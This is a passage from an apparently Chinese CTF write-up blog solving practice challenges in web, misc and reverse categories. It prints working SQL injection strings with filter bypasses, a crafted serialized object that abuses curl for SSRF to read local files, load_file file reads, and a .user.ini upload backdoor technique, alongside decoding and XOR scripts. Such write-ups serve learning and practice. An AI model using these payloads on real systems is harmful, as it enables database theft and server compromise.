die(+ACI-do not hack+ACEAIg)+ADs +AH0 +AH0<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$encoded</span> = <span class="hljs-string">&quot;+ADw?php if(+ACQAXw-GET+AFsAIg-filename+ACIAXQ)+AHs +ACQ-preg+AF8-match+AF8-username +AD0 &#x27;return preg+AF8-match(+ACI-/base+AHw-be+AHw-encode+AHw-print+AHw-zlib+AHw-quoted+AHw-write+AHw-rot13+AHw-read+AHw-string/i+ACI, +ACQAXw-GET+AFsAIg-filename+ACIAXQ)+ADs&#x27;+ADs if (eval(+ACQ-preg+AF8-match+AF8-username)) +AHs die(+ACI-do not hack+ACEAIg)+ADs +AH0 +AH0&quot;</span>;<br><span class="hljs-variable">$decoded</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;UTF-7&#x27;</span>, <span class="hljs-string">&#x27;UTF-8&#x27;</span>, <span class="hljs-variable">$encoded</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$decoded</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>])&#123;<br>        <span class="hljs-variable">$preg_match_username</span> = <span class="hljs-string">&#x27;return preg_match(&quot;/base|be|encode|print|zlib|quoted|write|rot13|read|string/i&quot;, $_GET[&quot;filename&quot;]);&#x27;</span>; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$preg_match_username</span>)) &#123;<br>            <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack!&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>猜测 flag.php</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs utf-7">+ADw?php +ACQ-flag+AD0&#x27;cyberpeace+AHs-3e6bc52e2f48074bc1530a88d5466a2b+AH0&#x27;+ADs<br></code></pre></td></tr></table></figure><p>即 <code>cyberpeace&#123;3e6bc52e2f48074bc1530a88d5466a2b&#125;</code></p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">&#x27;8b184b&#x27;</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))&#123;<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...再想想&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>] &gt; <span class="hljs-number">2022</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>]))&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Hgfks.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You&#x27;re right&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> Emmm...<br></code></pre></td></tr></table></figure><p>首先 <code>$a</code> 使用科学计数法绕过即 <code>9e9</code>（9 * 10 ^9)</p><p>$b使用脚本穷举即可，得到 <code>b = 53724</code></p><p>其次 <code>c = &#123;&quot;m&quot;:&quot;2023a&quot;,&quot;n&quot;:[[&quot;DGGJ&quot;],0]&#125;</code></p><p>其中 <code>array_search()</code>函数在数组中搜索某个键值，并返回对应的键名，传入0可使其返回值也为0，即可绕过</p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p><code>view.php?no=</code> 存在sql注入</p><p>其中过滤了命令中的空格</p><p><code>?no=-1 union/**/select/**/1,group_concat(no,&#39;~&#39;,username,&#39;~&#39;,passwd,&#39;~&#39;,data),3,4/**/from/**/fakebook.users</code> 绕过</p><p><img src="/posts/df9d333d/image-20240320171100537.png" srcset="/img/loading.gif" lazyload alt="image-20240320171100537"></p><p>可以看出 data 列中储存的是序列化后的字符串</p><p>同时访问<code>robots.txt</code> 发现存在备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><p>综上，需要我们构造反序列化链</p><p>因为 curl_exec 无防护，所以可以进行SSRF伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$res</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>);<br></code></pre></td></tr></table></figure><p>再通过 <code>-1 union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code>回显</p><p><img src="/posts/df9d333d/image-20240320171501482.png" srcset="/img/loading.gif" lazyload alt="image-20240320171501482"></p><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h3><p>回显点在第二个位置所以尝试直接 load_file 读取文件</p><p><code>?no=-1 union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4</code></p><p><img src="/posts/df9d333d/image-20240320172154027.png" srcset="/img/loading.gif" lazyload alt="image-20240320172154027"></p><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><p>文件上传，有内容检测</p><p>尝试发现 有 <strong>后端后缀检测</strong>、<strong>文件不能包含PHP字段</strong>、<strong>文件头检测</strong>、.<strong>htacess过滤</strong>、MIME检测</p><p>而 <code>.user.ini</code> 存活，</p><p><img src="/posts/df9d333d/image-20240320195512869.png" srcset="/img/loading.gif" lazyload alt="image-20240320195512869"></p><p><img src="/posts/df9d333d/image-20240320195547878.png" srcset="/img/loading.gif" lazyload alt="image-20240320195547878"></p><p>原理：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门 - phith0n (wooyun.js.org)</a><img src="/posts/df9d333d/image-20240320195936508.png" srcset="/img/loading.gif" lazyload alt="image-20240320195936508"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>题干得</p><h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>浏览器打开，<code>Ctrl</code>+<code>A</code> 复制即可</p><p><img src="/posts/df9d333d/image-20240320202101245.png" srcset="/img/loading.gif" lazyload alt="image-20240320202101245"></p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 与佛论禅">夜哆悉諳多苦奢陀奢諦冥神哆盧穆皤三侄三即諸諳即冥迦冥隸數顛耶迦奢若吉怯陀諳怖奢智侄諸若奢數菩奢集遠俱老竟寫明奢若梵等盧皤豆蒙密離怯婆皤礙他哆提哆多缽以南哆心曰姪罰蒙呐神。舍切真怯勝呐得俱沙罰娑是怯遠得呐數罰輸哆遠薩得槃漫夢盧皤亦醯呐娑皤瑟輸諳尼摩罰薩冥大倒參夢侄阿心罰等奢大度地冥殿皤沙蘇輸奢恐豆侄得罰提哆伽諳沙楞缽三死怯摩大蘇者數一遮<br></code></pre></td></tr></table></figure><p>得到 <code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><p>根据题意 rot13 解码</p><p><code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code></p><p>再通过 base64<img src="/posts/df9d333d/image-20240320202335296.png" srcset="/img/loading.gif" lazyload alt="image-20240320202335296"></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>用 stegsolver 逐帧查看得到二维码</p><p>补上定位码扫描即可</p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>idea 打开，查找得</p><p><img src="/posts/df9d333d/image-20240320202519584.png" srcset="/img/loading.gif" lazyload alt="image-20240320202519584"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><blockquote><p>菜鸡觉得前面的题目太难了，来个简单的缓一下</p></blockquote><p>ida 打开</p><p><code>shift</code> + <code>F12</code> 得到</p><p><img src="/posts/df9d333d/image-20240322183922916.png" srcset="/img/loading.gif" lazyload alt="image-20240322183922916"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><blockquote><p>菜鸡最近迷上了玩游戏，但它总是赢不了，你可以帮他获胜吗</p></blockquote><p><code>shift</code> + <code>F12</code></p><p><img src="/posts/df9d333d/image-20240322191031729.png" srcset="/img/loading.gif" lazyload alt="image-20240322191031729"></p><p>跳过来</p><p><img src="/posts/df9d333d/image-20240322191300434.png" srcset="/img/loading.gif" lazyload alt="image-20240322191300434"></p><p>异或回去就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_45E940</span>():<br>    v2 = <span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&quot;&#123; &quot;</span>)<br>    v2.extend([<span class="hljs-number">18</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">108</span>, <span class="hljs-number">65</span>, <span class="hljs-number">41</span>, <span class="hljs-number">124</span>, <span class="hljs-number">80</span>, <span class="hljs-number">125</span>, <span class="hljs-number">38</span>, <span class="hljs-number">124</span>, <span class="hljs-number">111</span>, <span class="hljs-number">74</span>, <span class="hljs-number">49</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>, <span class="hljs-number">94</span>, <span class="hljs-number">108</span>, <span class="hljs-number">84</span>, <span class="hljs-number">6</span>])<br>    v2.extend(<span class="hljs-string">b&quot;`S,yhn _uec&#123;&quot;</span>)<br>    v2.extend([<span class="hljs-number">127</span>, <span class="hljs-number">119</span>, <span class="hljs-number">96</span>, <span class="hljs-number">48</span>, <span class="hljs-number">107</span>, <span class="hljs-number">71</span>, <span class="hljs-number">92</span>, <span class="hljs-number">29</span>, <span class="hljs-number">81</span>, <span class="hljs-number">107</span>, <span class="hljs-number">90</span>, <span class="hljs-number">85</span>, <span class="hljs-number">64</span>, <span class="hljs-number">12</span>, <span class="hljs-number">43</span>, <span class="hljs-number">76</span>, <span class="hljs-number">86</span>, <span class="hljs-number">13</span>, <span class="hljs-number">114</span>, <span class="hljs-number">1</span>, <span class="hljs-number">117</span>, <span class="hljs-number">126</span>, <span class="hljs-number">0</span>])<br>    v5 = <span class="hljs-built_in">bytearray</span>(<br>        [<span class="hljs-number">18</span>, <span class="hljs-number">64</span>, <span class="hljs-number">98</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">65</span>, <span class="hljs-number">32</span>, <span class="hljs-number">12</span>, <span class="hljs-number">48</span>, <span class="hljs-number">65</span>, <span class="hljs-number">31</span>, <span class="hljs-number">78</span>, <span class="hljs-number">62</span>, <span class="hljs-number">32</span>, <span class="hljs-number">49</span>, <span class="hljs-number">32</span>, <span class="hljs-number">1</span>, <span class="hljs-number">57</span>, <span class="hljs-number">96</span>, <span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">62</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">44</span>, <span class="hljs-number">65</span>, <span class="hljs-number">78</span>, <span class="hljs-number">32</span>, <span class="hljs-number">16</span>, <span class="hljs-number">97</span>, <span class="hljs-number">54</span>, <span class="hljs-number">16</span>, <span class="hljs-number">44</span>, <span class="hljs-number">52</span>, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">89</span>, <span class="hljs-number">45</span>, <span class="hljs-number">32</span>, <span class="hljs-number">65</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>, <span class="hljs-number">18</span>, <span class="hljs-number">16</span>, <span class="hljs-number">0</span>]<br>    )<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">56</span>):<br>        <span class="hljs-comment"># print(v2[i])</span><br>        v2[i] ^= v5[i]<br>        v2[i] ^= <span class="hljs-number">0x13</span><br>        <span class="hljs-comment"># print(chr(v2[i]))</span><br><br>    <span class="hljs-keyword">return</span> v2.decode()<br><br><br><span class="hljs-built_in">print</span>(sub_45E940())<br><br></code></pre></td></tr></table></figure><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><blockquote><p>菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;what?\n&quot;</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> first = atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span> (first != <span class="hljs-number">0xcafe</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are wrong, sorry.\n&quot;</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> second = atoi(argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">if</span> (second % <span class="hljs-number">5</span> == <span class="hljs-number">3</span> || second % <span class="hljs-number">17</span> != <span class="hljs-number">8</span>) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>, argv[<span class="hljs-number">3</span>])) &#123;<br>    	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;so close, dude!\n&quot;</span>);<br>    	<span class="hljs-built_in">exit</span>(<span class="hljs-number">4</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Brr wrrr grr\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hash = first * <span class="hljs-number">31337</span> + (second % <span class="hljs-number">17</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]) - <span class="hljs-number">1615810207</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get your key: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, hash);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>审计代码</p><p>前面的判断都可以删去，同时把 hash 得参数填入即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hash = <span class="hljs-number">0xcafe</span> * <span class="hljs-number">31337</span> + (<span class="hljs-number">8</span>) * <span class="hljs-number">11</span> + <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;h4cky0u&quot;</span>) - <span class="hljs-number">1615810207</span>;<br><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322191714265.png" srcset="/img/loading.gif" lazyload alt="image-20240322191714265"></p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p><img src="/posts/df9d333d/image-20240322230144271.png" srcset="/img/loading.gif" lazyload alt="image-20240322230144271"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">v13 = <span class="hljs-string">&quot;437261636b4d654a757374466f7246756e&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span 